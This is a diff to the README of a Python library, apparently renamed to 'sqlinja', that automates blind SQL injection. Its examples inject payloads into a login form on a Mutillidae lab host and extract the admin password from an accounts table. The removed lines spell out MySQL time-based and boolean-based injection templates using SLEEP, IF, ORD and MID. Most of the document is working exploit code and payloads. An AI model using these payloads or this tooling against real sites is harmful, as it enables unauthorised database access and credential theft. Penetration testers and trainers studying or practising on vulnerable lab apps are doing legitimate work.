@@ -1,5 +1,5 @@
-# sqli-helper
-Python module for speed-up SQLI exploitation (Blind or other)
+# sqlinja
+SqlInja is a Python library designed to automate exploitation of SQL blind injection (time-based or boolean-based). It includes functions for generating payloads, sending requests, and analyzing responses.
 
 The extraction use [Binary search algorithm](https://en.wikipedia.org/wiki/Binary_search_algorithm) for define which candidate is the good value.
 
@@ -34,7 +34,7 @@ def exec_request(request: str) -> bool:
 def exec_request(payload: str) -> bool:
     url = "http://meta.local/mutillidae/index.php?page=login.php"
     datas = {
-        'username': f"test' {payload}",
+        'username': f"test' OR {payload} # ",
         'password': "pass",
         'login-php-submit-button': "Login",
     }
@@ -46,13 +46,7 @@ def exec_request(payload: str) -> bool:
 ### Check if target is vulnerable for payload
 
 ```python
-# define the template of the Injection
-# Basis MySQL Time based template
-template = string.Template(f'OR (SELECT 1 FROM (SELECT(SLEEP(IF(($request)$test,{sleep_duration},0))))a) # ')
-# Basis MySQL Boolean based template
-# template = string.Template('OR ($request)$test # ')
-
-helper = SqliHelper(MySqlConfig(), exec_request)
+helper = SqlInja(MySqlConfig(), exec_request, MySqlConfig.payload_int_time)
 # Is target vulnerable ?
 if(helper.check("SELECT 1")):
     print("Target is Vulnerable")
@@ -61,25 +55,21 @@ else:
     exit()
 ```
 
-### Exctract Data from a cell 
+### Extract Data from a cell 
 ```python
-# define the template of the Injection
-# Extract text MySQL Time based template
-template = string.Template(f'OR (SELECT 1 FROM (SELECT(SLEEP(IF(ORD(MID(($request),$index,1))$test,{sleep_duration},0))))a) # ')
-# Extract text MySQL Boolean based template
-# template = string.Template('OR ORD(MID(($request),$index,1))$test # ')
-
 # extract pass
 # the expected values are ASCII alphanum
-candidates = SqliHelper.string_to_candidates(string.ascii_letters + string.digits)
-
-helper.prepare_new(candidates, template=template)
-
+candidates = SqlInja.string_to_candidates(string.ascii_letters + string.digits)
+helper.prepare_new(candidates, template=MySqlConfig.payload_str_time)
 result = helper.extract_cell("SELECT password FROM accounts WHERE username = 'admin' LIMIT 0,1")
 print("pass for 'admin' : ", "".join(map(chr, result)))
 ```
 
 More examples in 'example' folder
+
+## Contributing
+
+Contributions are welcome! If you find a bug or have a feature request, please create an issue or submit a pull request.
 
 ## Legal disclaimer
 
